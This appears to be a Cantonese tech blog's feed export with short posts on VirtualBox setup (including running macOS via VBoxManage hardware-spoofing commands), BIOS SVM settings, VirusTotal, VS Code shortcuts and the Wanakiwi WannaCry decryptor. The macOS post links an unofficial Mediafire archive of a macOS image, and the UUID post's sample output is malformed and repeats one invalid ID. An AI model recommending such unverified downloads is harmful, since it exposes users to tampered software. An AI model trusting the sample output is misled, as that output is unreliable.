<p>loading …</p>
<img src="/2022/01/21/VirtualBox-install-windows-11/yo-14.png" class="">

<p>等…. (已經完成)</p>
<img src="/2022/01/21/VirtualBox-install-windows-11/hi.png" class="">
<img src="/2022/01/21/VirtualBox-install-windows-11/yo-15.png" class="">
<img src="/2022/01/21/VirtualBox-install-windows-11/yo-16.png" class="">
<img src="/2022/01/21/VirtualBox-install-windows-11/yo-18.png" class="">
<img src="/2022/01/21/VirtualBox-install-windows-11/yo-19.png" class="">
<img src="/2022/01/21/VirtualBox-install-windows-11/yo-20.png" class="">
<img src="/2022/01/21/VirtualBox-install-windows-11/yo-21.png" class="">

<p>完成。</p>
</center>

<p>參考資料 :<br><a href="https://www.youtube.com/watch?v=Pquf9DK3ElI">https://www.youtube.com/watch?v=Pquf9DK3ElI</a></p>
]]></content>
      <categories>
        <category>VirtualBox</category>
        <category>windows 11</category>
      </categories>
      <tags>
        <tag>安裝</tag>
        <tag>指令</tag>
        <tag>Regedit</tag>
      </tags>
  </entry>
  <entry>
    <title>VirtualBox - 只有 32 Bit 或者不能啟動</title>
    <url>/2022/01/06/VirtualBox-only-display-32bit-problem-fix/</url>
    <content><![CDATA[<h1 id="問題"><a href="#問題" class="headerlink" title="問題"></a>問題</h1><p>點解你部機裝完 <code>VirtualBox</code> 又或者 <code>VMWare</code> 會係得 32 Bit選擇？</p>
<img src="/2022/01/06/VirtualBox-only-display-32bit-problem-fix/32bitonly.png" class="">

<p>又或者點解裝完會開唔到部 VM 出 Error ?</p>
<p>有 d 機本身係冇 Enable <code>SVM Mode</code></p>
<p>入返 BIOS 搵返 SVM Mode 再由 本身既 <code>Disabled</code> 改做 <code>Enabled</code> 就會開得返。</p>
<p>而加你要搵返你部機既老母版係咩型號先。</p>
<h1 id="搵-BIOS-版本、老母板製造商同型號"><a href="#搵-BIOS-版本、老母板製造商同型號" class="headerlink" title="搵 BIOS 版本、老母板製造商同型號"></a>搵 BIOS 版本、老母板製造商同型號</h1><p>BIOS 版本、主機板 (系統) 製造商及主機板 (系統) 的型號資訊，可以利用內建的 Microsoft 系統資訊工具找到。</p>
<p>系統資訊會顯示關於系統硬體、系統元件和軟體環境的資訊。</p>
<p>若要檢視系統資訊：</p>
<ol>
<li>按下Windows 鍵鍵盤上的 Windows 鍵並開始輸入系統，選擇系統資訊，該系統資訊將顯示含有處理器名稱、號碼和速度的處理器資訊。</li>
<li>如果您的鍵盤上沒有 Windows 鍵，請使用您的滑鼠，並前往螢幕左下角的 Windows 圖示、按下滑鼠右鍵然後選擇系統。</li>
<li>選擇系統資訊以檢視系統製造、型號和 BIOS 版本。</li>
</ol>
<p>請參閱下列範例：</p>
<img src="/2022/01/06/VirtualBox-only-display-32bit-problem-fix/find.png" class="">

<p>或者 下載 CPU-Z<br><a href="https://www.cpuid.com/softwares/cpu-z.html">https://www.cpuid.com/softwares/cpu-z.html</a></p>
<img src="/2022/01/06/VirtualBox-only-display-32bit-problem-fix/cpu-z.png" class="">


<h1 id="BIOS-Key"><a href="#BIOS-Key" class="headerlink" title="BIOS Key"></a>BIOS Key</h1><p>搵到之後你再睇下你要撳邊粒制先入到 Bios 畫面 :</p>
<ul>
<li>Acer: F2 或 DEL</li>
<li>ASUS: 所有個人電腦為 F2、主板為 F2 或 DEL</li>
<li>Dell: F2 或 F12</li>
<li>HP: ESC 或 F10</li>
<li>Lenovo: F2 或 Fn + F2</li>
<li>Lenovo (桌面電腦): F1</li>
<li>Lenovo (ThinkPads): Enter + F1.</li>
<li>MSI: 主板和個人電腦為 DEL</li>
<li>Microsoft Surface 平板電腦: 按住調高音量按鈕</li>
<li>Origin 個人電腦: F2</li>
<li>Samsung: F2</li>
<li>Sony: F1, F2, 或 F3</li>
<li>Toshiba: F2</li>
<li>GigaByte: Delete 或 F12</li>
</ul>
<h1 id="改-SVM-Mode"><a href="#改-SVM-Mode" class="headerlink" title="改 SVM Mode"></a>改 SVM Mode</h1><p>之後去搵 SVM Mode 將佢 Enabled 返就 OK</p>
<img src="/2022/01/06/VirtualBox-only-display-32bit-problem-fix/svm.png" class="">

<h1 id="More-Detail"><a href="#More-Detail" class="headerlink" title="More Detail"></a>More Detail</h1><p><a href="https://www.hp.com/hk-zh/shop/tech-takes/post/%E5%A6%82%E4%BD%95%E5%9C%A8-windows-%E5%80%8B%E4%BA%BA%E9%9B%BB%E8%85%A6%E4%B8%8A%E9%80%B2%E5%85%A5-bios-%E8%A8%AD%E7%BD%AE">https://www.hp.com/hk-zh/shop/tech-takes/post/%E5%A6%82%E4%BD%95%E5%9C%A8-windows-%E5%80%8B%E4%BA%BA%E9%9B%BB%E8%85%A6%E4%B8%8A%E9%80%B2%E5%85%A5-bios-%E8%A8%AD%E7%BD%AE</a><br><a href="https://www.youtube.com/watch?v=YMX5gjZIeU4">https://www.youtube.com/watch?v=YMX5gjZIeU4</a><br><a href="https://www.intel.com.tw/content/www/tw/zh/support/articles/000022425/processors.html">https://www.intel.com.tw/content/www/tw/zh/support/articles/000022425/processors.html</a><br><a href="https://kknews.cc/zh-tw/digital/aar3prj.html">https://kknews.cc/zh-tw/digital/aar3prj.html</a></p>
]]></content>
      <categories>
        <category>VirtualBox</category>
      </categories>
      <tags>
        <tag>BIOS</tag>
        <tag>Shortkeys</tag>
        <tag>問題</tag>
      </tags>
  </entry>
  <entry>
    <title>VirtualBox - 安裝 MacOS BigSur</title>
    <url>/2022/01/16/VirtualBox-install-MacOS-BigSur/</url>
    <content><![CDATA[<h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>如果你想在 VirtualBox 內使用 MacOS 系統，<br>你需要另外輸入指令以開啟 iso 檔，<br>接下來會全程教學。</p>
<h1 id="下載檔案"><a href="#下載檔案" class="headerlink" title="下載檔案"></a>下載檔案</h1><p>喺開始之前，我地需要下載 MacOS BigSur iso 檔案 :</p>
<pre><code>https://www.mediafire.com/file/9vuo3rcmv0r8ag4/MAC_OS_BIG_SUR.rar/file
</code></pre>
<h1 id="VirtualBox-建立新主機"><a href="#VirtualBox-建立新主機" class="headerlink" title="VirtualBox 建立新主機"></a>VirtualBox 建立新主機</h1><p>我地開 VirtualBox 開 Create 個新既主機，名就你鐘意起乜就起乜。</p>
<img src="/2022/01/16/VirtualBox-install-MacOS-BigSur/1.png" class="">


<h2 id="選擇-Ram-大小"><a href="#選擇-Ram-大小" class="headerlink" title="選擇 Ram 大小"></a>選擇 Ram 大小</h2><p>選擇你想要既 Ram 既大小。<br>如果你部機係用緊 8GB Ram，就建議用 4 GB (4096MB)。<br>如果你部機係用緊 16GB Ram，就建議係 5 GB 內 (5120MB)。<br>如果你部機係用緊 32GB Ram，就建議直接用 16 GB (16384MB)。</p>
<h3 id="GB-計算方法"><a href="#GB-計算方法" class="headerlink" title="GB 計算方法"></a>GB 計算方法</h3><p>1GB = 1024 MB<br>1024 * 4 = 4096MB<br>所以 4GB Ram = 4096MB</p>
<img src="/2022/01/16/VirtualBox-install-MacOS-BigSur/4096.png" class="">


<h2 id="建立虛擬硬碟"><a href="#建立虛擬硬碟" class="headerlink" title="建立虛擬硬碟"></a>建立虛擬硬碟</h2><p>由於我地係要用新起既虛擬硬碟，所以請選擇 <code>立即建立虛擬主機(C)</code>。</p>
<img src="/2022/01/16/VirtualBox-install-MacOS-BigSur/vmdk.png" class="">

<h2 id="選擇處擬硬碟類型"><a href="#選擇處擬硬碟類型" class="headerlink" title="選擇處擬硬碟類型"></a>選擇處擬硬碟類型</h2><p>類型選擇 VDI (VirtualBox 類型)。</p>
<img src="/2022/01/16/VirtualBox-install-MacOS-BigSur/VDI.png" class="">

<h2 id="硬碟分配"><a href="#硬碟分配" class="headerlink" title="硬碟分配"></a>硬碟分配</h2><p>呢邊選擇 <code>動態分配</code>。</p>
<img src="/2022/01/16/VirtualBox-install-MacOS-BigSur/AN.png" class="">

<h2 id="硬碟大小"><a href="#硬碟大小" class="headerlink" title="硬碟大小"></a>硬碟大小</h2><p>選擇你想要的硬碟大小，然後就完成建立主機了。</p>
<img src="/2022/01/16/VirtualBox-install-MacOS-BigSur/harddisk.png" class="">


<h1 id="設定主機設置"><a href="#設定主機設置" class="headerlink" title="設定主機設置"></a>設定主機設置</h1><p>呢度我地要將部機既 Setting 改小小野，包括係 :</p>
<ul>
<li>剪貼簿設置</li>
<li>開機順序</li>
<li>視訊記憶體</li>
<li>虛理器</li>
<li>圖形控制器 </li>
</ul>
<h2 id="修改共用剪貼簿設置"><a href="#修改共用剪貼簿設置" class="headerlink" title="修改共用剪貼簿設置"></a>修改共用剪貼簿設置</h2><p>對住主機撳右鍵去 <code>Setting</code> &gt; <code>一般</code>，<br>將共用剪貼簿同拖放改做雙向。</p>
<img src="/2022/01/16/VirtualBox-install-MacOS-BigSur/d.png" class="">


<h2 id="修改開機順序"><a href="#修改開機順序" class="headerlink" title="修改開機順序"></a>修改開機順序</h2><p>再黎入去 系統 &gt; 主機版<br>將開機順序既 <code>軟碟</code> <code>光碟</code> Tick 走佢唔要</p>
<img src="/2022/01/16/VirtualBox-install-MacOS-BigSur/system.png" class="">

<h2 id="修改虛理器大小"><a href="#修改虛理器大小" class="headerlink" title="修改虛理器大小"></a>修改虛理器大小</h2><p>再黎入去 系統 &gt; 虛理器<br>將虛理器既 CPU 改做 4</p>
<img src="/2022/01/16/VirtualBox-install-MacOS-BigSur/cpu-4.png" class="">

<h2 id="修改圖形控制器"><a href="#修改圖形控制器" class="headerlink" title="修改圖形控制器"></a>修改圖形控制器</h2><p>再黎入去 顯示 &gt; 畫面<br>將 視訊記憶體改做 128 MB<br>再將 圖形控制器 改做 VBoxSVGA</p>
<img src="/2022/01/16/VirtualBox-install-MacOS-BigSur/SVGA-128.png" class="">


<h1 id="指令修改"><a href="#指令修改" class="headerlink" title="指令修改"></a>指令修改</h1><p>呢度既目的係為左俾 VirtualBox 讀到你個 iso 檔，原本係 macOS 係做左手腳唔俾人就咁 READ。</p>
<h2 id="開啟指令台-cd-VirtualBox"><a href="#開啟指令台-cd-VirtualBox" class="headerlink" title="開啟指令台 (cd VirtualBox)"></a>開啟指令台 (cd VirtualBox)</h2><p>開你既任何一個可以打指令既工具，然後 <code>cd</code> 入去 你安裝既 VirtualBox 位置。</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment"># Now Paths is c:\</span></span><br><span class="line"><span class="built_in">cd</span> <span class="string">&quot;C:\Program Files\Oracle\VirtualBox\&quot;</span></span><br></pre></td></tr></table></figure>

<h2 id="修改指令"><a href="#修改指令" class="headerlink" title="修改指令"></a>修改指令</h2><p>再打呢6句野，<br>注意，<code>Your VM Name</code> 係要改返做你起既 VM 名稱。</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">.\VBoxManage.exe modifyvm <span class="string">&quot;Your VM Name&quot;</span> --cpuidset 00000001 000106e5 00100800 0098e3fd bfebfbff</span><br><span class="line">.\VBoxManage.exe setextradata <span class="string">&quot;Your VM Name&quot;</span> <span class="string">&quot;VBoxInternal/Devices/efi/0/Config/DmiSystemProduct&quot;</span> <span class="string">&quot;iMac11,3&quot;</span></span><br><span class="line">.\VBoxManage.exe setextradata <span class="string">&quot;Your VM Name&quot;</span> <span class="string">&quot;VBoxInternal/Devices/efi/0/Config/DmiSystemVersion&quot;</span> <span class="string">&quot;1.0&quot;</span></span><br><span class="line">.\VBoxManage.exe setextradata <span class="string">&quot;Your VM Name&quot;</span> <span class="string">&quot;VBoxInternal/Devices/efi/0/Config/DmiBoardProduct&quot;</span> <span class="string">&quot;Iloveapple&quot;</span></span><br><span class="line">.\VBoxManage.exe setextradata <span class="string">&quot;Your VM Name&quot;</span> <span class="string">&quot;VBoxInternal/Devices/smc/0/Config/DeviceKey&quot;</span> <span class="string">&quot;ourhardworkbythesewordsguardedpleasedontsteal(c)AppleComputerInc&quot;</span></span><br><span class="line">.\VBoxManage.exe setextradata <span class="string">&quot;Your VM Name&quot;</span> <span class="string">&quot;VBoxInternal/Devices/smc/0/Config/GetKeyFromRealSMC&quot;</span> 1</span><br></pre></td></tr></table></figure>

<h2 id="測試開機"><a href="#測試開機" class="headerlink" title="測試開機"></a>測試開機</h2><p>完成左之後開你部機再選擇返岩岩下載左既 iso 檔，咁就成功啦。</p>
<img src="/2022/01/16/VirtualBox-install-MacOS-BigSur/Hi%20open.png" class="">

<h2 id="成功開啟"><a href="#成功開啟" class="headerlink" title="成功開啟"></a>成功開啟</h2><p>見到呢個畫面就代表已經成功開啟 macOS。</p>
<img src="/2022/01/16/VirtualBox-install-MacOS-BigSur/DONE-OPEN.png" class="">
<img src="/2022/01/16/VirtualBox-install-MacOS-BigSur/DONE-OPEN-2.png" class="">


<p>參考資料:<br><a href="https://www.youtube.com/watch?v=0RJWGWQfgYs">https://www.youtube.com/watch?v=0RJWGWQfgYs</a><br><a href="https://www.dev2qa.com/how-to-install-macos-on-virtualbox-in-windows-10/">https://www.dev2qa.com/how-to-install-macos-on-virtualbox-in-windows-10/</a></p>
]]></content>
      <categories>
        <category>VirtualBox</category>
        <category>MacOS</category>
      </categories>
      <tags>
        <tag>安裝</tag>
      </tags>
  </entry>
  <entry>
    <title>VirtualBox - 網路介面卡設定</title>
    <url>/2022/01/25/VirtualBox-settings-Network-interface/</url>
    <content><![CDATA[<h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><h3 id="以下不專業解釋-…"><a href="#以下不專業解釋-…" class="headerlink" title="以下不專業解釋 …"></a>以下不專業解釋 …</h3><p>喺 VirtualBox 入面，<br>如果你要將你呢部機既 Network 同你屋企既 Wifi 喺同一個 interface，<br>你需要喺設定度由 <code>NAT</code> 改做 <code>橋接介面卡</code>，<br>咁樣你呢個 Network 先可以 Detect 到你呢部 VM 機既存在。</p>
<p>事關你而加用緊 <code>NAT</code> 既情況係同你部實體機係一個分開獨立 <code>網路介面卡</code>，<br>所以佢就 Detect 唔到你呢部 VM 喺你既 Network 入面。</p>
<h2 id="開始"><a href="#開始" class="headerlink" title="開始"></a>開始</h2><p>我地可以喺你既 Windows 開 CMD 打 <code>ipconfig</code></p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">C:\Users\fuckyou&gt; ipconfig</span><br><span class="line">乙太網路卡 VirtualBox Host-Only Network:</span><br><span class="line"></span><br><span class="line">   連線特定 DNS 尾碼 . . . . . . . . :</span><br><span class="line">   IPv4 位址 . . . . . . . . . . . . : 192.168.56.1</span><br><span class="line">   子網路遮罩 . . . . . . . . . . . .: 255.255.255.0</span><br><span class="line">   預設閘道 . . . . . . . . . . . . .:</span><br></pre></td></tr></table></figure>

<p>見到呢個位就可以睇到，<br>你部 VM 冇修改過既話就係會用呢個介面卡去上網。</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">C:\Users\fuckyou&gt; ipconfig</span><br><span class="line">乙太網路卡 乙太網路:</span><br><span class="line"></span><br><span class="line">   連線特定 DNS 尾碼 . . . . . . . . :  DLLM</span><br><span class="line">   IPv4 位址 . . . . . . . . . . . . : 192.168.0.200</span><br><span class="line">   子網路遮罩 . . . . . . . . . . . .: 255.255.255.0</span><br><span class="line">   預設閘道 . . . . . . . . . . . . .: 192.168.0.1</span><br></pre></td></tr></table></figure>

<p>而呢個就係我地屋企用緊既 WIFI，<br>我地需要去修改到入去呢張卡既 Gateway先得。</p>
<h3 id="詳細說明"><a href="#詳細說明" class="headerlink" title="詳細說明"></a>詳細說明</h3><p>所有 VirtualBox 既預設 Create 完既 Machine 都會係用呢個。<br>除非你改做 <code>橋接介面卡</code>，唔係都係會係用緊佢原先安裝好既 <code>虛擬介面卡</code>。</p>
<h2 id="修改示範"><a href="#修改示範" class="headerlink" title="修改示範"></a>修改示範</h2><p>我地修先要確保你係熄左你要改既個部 VM 機既 Windows 先，<br>然後再跟住我以下步驟。</p>
<img src="/2022/01/25/VirtualBox-settings-Network-interface/how.gif" class="">

<p>完成。</p>
]]></content>
      <categories>
        <category>VirtualBox</category>
      </categories>
      <tags>
        <tag>Gui</tag>
        <tag>Network</tag>
      </tags>
  </entry>
  <entry>
    <title>Virtualbox - 調整顯示解析度 | Liunx (APT)</title>
    <url>/2022/01/22/Virtualbox-adjustment-display-resolution-Linux-apt/</url>
    <content><![CDATA[<h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>喺 APT 度，要改 Display Resolution有兩種方法，</p>
<ul>
<li>撳制 Gui自動化安裝</li>
<li>指令安裝</li>
</ul>
<h2 id="Gui-安裝"><a href="#Gui-安裝" class="headerlink" title="Gui 安裝"></a>Gui 安裝</h2><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">sudo apt-get update -y</span><br><span class="line">sudo apt-get install virtualbox-guest-dkms virtualbox-guest-x11</span><br></pre></td></tr></table></figure>

<img src="/2022/01/22/Virtualbox-adjustment-display-resolution-Linux-apt/11.png" class="">

<p>然後 reboot 部機</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">reboot</span><br></pre></td></tr></table></figure>

<p>再 reload full screen 撳 Host + F 就成功。</p>
<img src="/2022/01/22/Virtualbox-adjustment-display-resolution-Linux-apt/2.png" class="">
<img src="/2022/01/22/Virtualbox-adjustment-display-resolution-Linux-apt/33.png" class="">

<p>成功。</p>
<p>參考資料:<br><a href="https://askubuntu.com/questions/211163/virtualbox-how-do-i-change-guest-precise-resolution-to-169-1920x1080-inste">https://askubuntu.com/questions/211163/virtualbox-how-do-i-change-guest-precise-resolution-to-169-1920x1080-inste</a></p>
]]></content>
      <categories>
        <category>VirtualBox</category>
        <category>Linux (APT)</category>
      </categories>
      <tags>
        <tag>指令</tag>
      </tags>
  </entry>
  <entry>
    <title>Virtualbox - 調整顯示解析度 | MacOS</title>
    <url>/2022/01/16/Virtualbox-adjustment-display-resolution-MacOS/</url>
    <content><![CDATA[<h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>要改 MacOS 既 Display Resolution，<br>我地需要用指令去改變。</p>
<h1 id="指令"><a href="#指令" class="headerlink" title="指令"></a>指令</h1><p>首先 用 Powershell cd 入返去 你既 VirtualBox 位置。</p>
<p>然後打呢抽野</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">.\VBoxManage.exe setextradata &quot;Your VM Name&quot; VBoxInternal2/EfiGraphicsResolution 1920x1080</span><br></pre></td></tr></table></figure>
<p>注意，”Your VM Name” 要改返做你部 VM 既名。</p>
<p>完成。</p>
]]></content>
      <categories>
        <category>VirtualBox</category>
        <category>MacOS</category>
      </categories>
      <tags>
        <tag>指令</tag>
      </tags>
  </entry>
  <entry>
    <title>Virtualbox - 檢查 UUID</title>
    <url>/2022/01/16/Virtualbox-get-uuid/</url>
    <content><![CDATA[<img src="/img/Post/image/VirtualBox/logo.png" width="200px"/>

<h1 id="UUID-說明"><a href="#UUID-說明" class="headerlink" title="UUID 說明"></a>UUID 說明</h1><p>以下內容轉自 wiki。</p>
<p>通用唯一標識符 (UUID) 是用於計算機系統中信息的 128 位標籤，還使用了術語全局唯一標識符 (GUID)。</p>
<p>當根據標準方法生成時，出於實際目的，UUID 是唯一的，與大多數其他編號方案不同，它們的獨特性不依賴於中央註冊機構或生成它們的各方之間的協調。<br>雖然 UUID 被複製的概率不為零，但它足夠接近於零，可以忽略不計。</p>
<p>因此，任何人都可以創建一個 UUID 並使用它來識別某物，並且幾乎可以肯定該標識符不會重複已經或將要創建以識別其他東西的標識符，因此，獨立方用 UUID 標記的信息可以在以後組合到單個數據庫中或在同一通道上傳輸，重複的可能性可以忽略不計。</p>
<p>簡單黎講，呢個 ID 係用黎識別你部機。</p>
<pre><code>UUID 被複製的概率不為零，但它足夠接近於零。
</code></pre>
<h1 id="操作"><a href="#操作" class="headerlink" title="操作"></a>操作</h1><p>我地要檢查既話就需要使用指令操作，<br>接下來請你開啟你隨便一個能使用指令的工具 (eg: cmd, Powershell, Windows Terminal)。</p>
<h2 id="cd-至-VirtualBox"><a href="#cd-至-VirtualBox" class="headerlink" title="cd 至 VirtualBox"></a>cd 至 VirtualBox</h2><p>首先請你開啟你既 CMD <code>cd</code> (Change Directory) 到 VirtualBox 位置。</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">cd Program files\VirtualBox</span><br></pre></td></tr></table></figure>

<h2 id="開啟-VBoxManage"><a href="#開啟-VBoxManage" class="headerlink" title="開啟 VBoxManage"></a>開啟 VBoxManage</h2><p>當你 cd 完之後再輸入以下指令。</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">.\VBoxManage.exe list vms</span><br></pre></td></tr></table></figure>

<h3 id="輸出"><a href="#輸出" class="headerlink" title="輸出"></a>輸出</h3><p>輸入完成後會出現以下的 Printout，這就是你的 UUID 和 String (名稱)了。</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">&quot;Hello VM&quot; &#123;9310139-9439-919319&#125;</span><br><span class="line">&quot;Hello VM2&quot; &#123;9310139-9439-919319&#125;</span><br><span class="line">&quot;Hello VM3&quot; &#123;9310139-9439-919319&#125;</span><br><span class="line">&quot;Hello VM4&quot; &#123;9310139-9439-919319&#125;</span><br></pre></td></tr></table></figure>

<p>參考資料:<br><a href="https://superuser.com/questions/1071711/virtualbox-vboxmanager-not-seeing-vms">https://superuser.com/questions/1071711/virtualbox-vboxmanager-not-seeing-vms</a></p>
]]></content>
      <categories>
        <category>VirtualBox</category>
      </categories>
      <tags>
        <tag>指令</tag>
      </tags>
  </entry>
  <entry>
    <title>Virustotal - 線上病毒木馬 Scanner</title>
    <url>/2022/05/23/Virustotal-website/</url>
    <content><![CDATA[<h1 id="介紹"><a href="#介紹" class="headerlink" title="介紹"></a>介紹</h1><p><a href="https://www.virustotal.com/gui/">VirusTotal</a> 聚合了許多防病毒產品和在線掃描引擎，稱為 Contributors。<br>來自這些貢獻者的匯總數據允許用戶檢查用戶自己的防病毒軟件可能遺漏的病毒，或針對任何誤報進行驗證，<br>最大 650 MB 的文件可以上傳到網站，或通過電子郵件發送（最大 32MB）。<br>防病毒軟件供應商可以接收被其他掃描標記但被他們自己的引擎傳遞的文件的副本，以幫助改進他們的軟件，進而改進 VirusTotal 自身的能力。<br>用戶還可以掃描可疑 URL 並蒐索 VirusTotal 數據集。<br>VirusTotal 使用 Cuckoo 沙箱對惡意軟件進行動態分析。</p>
<h2 id="分析"><a href="#分析" class="headerlink" title="分析 :"></a>分析 :</h2><ul>
<li>URL, IP Addrss, domain</li>
<li>Files</li>
</ul>
<p>官網 : <a href="https://www.virustotal.com/gui/">https://www.virustotal.com/gui/</a></p>
<h2 id="網站"><a href="#網站" class="headerlink" title="網站"></a>網站</h2><img src="/2022/05/23/Virustotal-website/vt1.png" class="">

<h2 id="示範"><a href="#示範" class="headerlink" title="示範"></a>示範</h2><p>以下我隨便用一個 files 做示範，示範檔案係 png files，<br>因為呢個 files 係全新未被 Scan 過既關係，<br>Virustotal 會再完全重新 Scan 過，<br>如果被 Scan 過會出現上一次 Scan 既記錄，<br>又或者你可以再 Scan 多次。</p>
<img src="/2022/05/23/Virustotal-website/how.gif" class="">]]></content>
      <categories>
        <category>網站推薦</category>
      </categories>
      <tags>
        <tag>Security</tag>
      </tags>
  </entry>
  <entry>
    <title>Visual Studio Code - 鍵盤快捷鍵</title>
    <url>/2022/01/22/Visual-Studio-Code-keyboard-shortcuts-for-windows/</url>
    <content><![CDATA[<h1 id="快捷鍵"><a href="#快捷鍵" class="headerlink" title="快捷鍵"></a>快捷鍵</h1><h4 id="Markdown-file-Preview"><a href="#Markdown-file-Preview" class="headerlink" title="Markdown file Preview"></a>Markdown file Preview</h4><blockquote>
<p>Ctrl + Shift + v</p>
</blockquote>
<h4 id="Open-Terminal"><a href="#Open-Terminal" class="headerlink" title="Open Terminal"></a>Open Terminal</h4><blockquote>
<p>Ctrl + Shift + ~ </p>
</blockquote>
<h4 id="Open-CMD"><a href="#Open-CMD" class="headerlink" title="Open CMD"></a>Open CMD</h4><blockquote>
<p>Ctrl + Shift + C</p>
</blockquote>
<h4 id="Markdown-Preview"><a href="#Markdown-Preview" class="headerlink" title="Markdown Preview"></a>Markdown Preview</h4><blockquote>
<p>Ctrl + Shift + v</p>
</blockquote>
<h4 id="Search-files-by-name"><a href="#Search-files-by-name" class="headerlink" title="Search files by name"></a>Search files by name</h4><blockquote>
<p>Ctrl + p</p>
</blockquote>
<h4 id="Open-File"><a href="#Open-File" class="headerlink" title="Open File"></a>Open File</h4><blockquote>
<p>Ctrl + O</p>
</blockquote>
<h4 id="Close-one-file-windows"><a href="#Close-one-file-windows" class="headerlink" title="Close one file windows"></a>Close one file windows</h4><blockquote>
<p>Ctrl + w</p>
</blockquote>
<h4 id="Restore-Previous-Windows"><a href="#Restore-Previous-Windows" class="headerlink" title="Restore Previous Windows"></a>Restore Previous Windows</h4><blockquote>
<p>Ctrl + Shift + T</p>
</blockquote>
<p><a href="https://code.visualstudio.com/shortcuts/keyboard-shortcuts-windows.pdf">https://code.visualstudio.com/shortcuts/keyboard-shortcuts-windows.pdf</a></p>
]]></content>
      <categories>
        <category>Visual Studio Code</category>
      </categories>
      <tags>
        <tag>Shortkeys</tag>
      </tags>
  </entry>
  <entry>
    <title>Wanakiwi - 將已受 Wannacry 加密的檔案解密</title>
    <url>/2022/01/09/Wanakiwi/</url>
    <content><![CDATA[<h1 id="介紹"><a href="#介紹" class="headerlink" title="介紹"></a>介紹</h1><p>This utility allows machines infected by the WannaCry ransomware to recover their files.</p>
<p><a href="https://github.com/gentilkiwi/wanakiwi">wanakiwi</a> is based on wanadecrypt which makes possible for lucky users to :</p>
<p>Recover the private user key in memory to save it as 00000000.dky<br>Decrypt all of their files</p>
<p>The Primes extraction method is based on Adrien Guinet’s wannakey which consist of scanning the WannaCry process memory to recover the prime numbers that were not cleaned during CryptReleaseContext().</p>
<p>Adrien’s method was originally described as only valid for Windows XP but @msuiche and I proved this can be extended to Windows 7.</p>
<img src="/2022/01/09/Wanakiwi/win7x86.png" class="">

<h1 id="原理"><a href="#原理" class="headerlink" title="原理"></a>原理</h1><p>安全研究人員Adrien Guinet發現了WannaCry在生成金鑰後使用的系統內建Windows Crypt APIs來清除記憶體中的私鑰，不過在舊版Windows中該API有漏洞導致生成加密金鑰的質數會殘留在記憶體中，擷取成功的話可以用來反推加密私鑰，Adrien Guinet發佈了可以在Windows XP上使用的WannaKey工具，今天另一名研究人員Benjamin Delpy將此方式使用到Windows 7上取得成功，發佈了更新版的WanaKiwi解密工具。</p>
<p>首先對加密原理不太熟的人解釋對稱與非對稱加密，對稱加密代表加密與解密都是用同一把金鑰，對稱加密比較有名的是AES加密法，對稱加密的好處為速度快以及強度非常高，但缺點為只能用在本地端，就跟你無法把一個上鎖的盒子和鑰匙一起寄給別人，因為中途被攔截就可以直接被打開了。非對稱加密解決了這個通信問題，最有名的為RSA加密法，RSA加密利用了電腦無法有效的計算質數分解問題的弱點，使用兩個非常龐大的質數來形成一對金鑰，用其中一個金鑰加密後只能用另一個與其配對的金鑰進行解密，如此一來就可以在本地端儲存一把金鑰叫做私鑰，另一把則對外公布叫做公鑰，當甲要把資訊寄給乙，甲就用乙的公鑰加密這樣該檔案就只有擁有自己私鑰的乙才打得開，甲同時也可以附上一段用自己私鑰加密的訊息，讓乙可以用甲的公鑰來確認發件者的身份，非對稱加密的缺點為加密速度慢。</p>
<p>每一個勒索病毒的加密方式都略有不同，以下的解釋僅限定於WannaCry，目前比較先進的勒索病毒具備了以下幾個特性：可以離線加密、加密速度快讓被害人察覺的可能性降低、讓作者具有解密能力、以及高安全性，這些先進的勒索病毒通常會使用Hybrid Encryption混合了對稱與非對稱加密的優點，將這次的WannaCry 勒索病毒除了以上提到的Windows系統API漏洞外也使用了Hybrid Encryption具備了以上所有的特性，首先每個病毒都事先內建了作者的RSA-2048公鑰（簡稱RSA2)，使病毒不需要向作者私服器要求金鑰，讓WannaCry具有離線加密的能力，當毒發時WanaCry會在被害者的本地端建立另一組每個受害者都不同的加密用的RSA公鑰（存放在00000000.pky）與私鑰，加密用私鑰會被病毒用作者的公鑰（RSA2）加密，然後存放在00000000.eky，接下來病毒使用系統內建的Windows Crypt APIs清除記憶體中儲存的加密私鑰，讓被害者無法用其解密，病毒會對每一個要被加密的檔案用隨機生成的獨特AES-128金鑰加密，然後每個檔案的AES加密金鑰會被用剛剛生成的加密用公鑰00000000.pky加密。</p>
<p>由於檔案主要是用AES對稱加密法加密所以具有對稱加密速度快的特性，但是要解密時則需要與00000000.pky對應的私鑰（00000000.eky的解密版）來先解密每個檔案的AES金鑰，要獲取00000000.eky的解密版除非用上面提到的記憶體漏洞，在不花上幾十幾百年暴力破解的情況下就只能付款後把00000000.eky寄給作者，用作者的私鑰（與RSA2對應的金鑰）解密，當然作者會不會真的幫你解密就不知道了。</p>
<p>除了使用以上WanaKiwi工具或付款賭賭看外，另一個有可能救回部分檔案的方式是使用磁碟救援工具，但是根據賽門鐵克研究人員的分析WannaCry會對儲存在桌面(Desktop)、我的文件(My Documents)、以及任何可移除硬碟中的檔案磁區複寫，導致磁碟救援工具失效，不過儲存在以上這三個地點外的檔案在沒被其他東西複寫前是有可以被磁碟救援工具救援的可能性。</p>
